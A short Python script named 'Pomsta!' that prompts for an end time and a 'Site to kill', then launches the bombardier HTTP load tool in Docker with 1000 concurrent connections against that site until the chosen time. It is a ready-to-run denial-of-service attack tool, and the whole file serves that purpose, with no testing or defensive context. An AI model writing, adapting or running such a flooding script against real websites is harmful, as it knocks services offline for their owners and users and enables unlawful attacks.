import os
import re
import datetime

if (__name__ == '__main__'):

    print('Pomsta! Command version.\n\nWork until')

    hour = ''

    while (not re.fullmatch(r'\d{1,2}', hour) or int(hour) > 23):
        hour = input('\nHour: ')

    hour = int(hour)

    min = ''

    while (not re.fullmatch(r'\d{1,2}', min) or int(min) > 59):
        min = input('\nMinute: ')

    min = int(min)

    site = ''

    while (not re.fullmatch(r'[a-z]+\.[a-z]+(/?.*)*|[a-z]+\.[a-z]+\.[a-z](/?.*)*', site)):
        site = input('\nSite to kill: ')

    c = ''

    while (c != 'y' and c != 'n'):
        c = input('\nAlmost done. Are you sure you want to kill this site? (y/n): ')

    if (c == 'y'):

        print('\nTo stop the attack, enter \'docker stop pomsta\'.\n')

        t = datetime.datetime.now()

        os.system(f'docker run --name pomsta -ti --rm alpine/bombardier -c 1000 -d {(hour - t.hour) * 3600 + (min - t.minute) * 60}s -l https://{site}')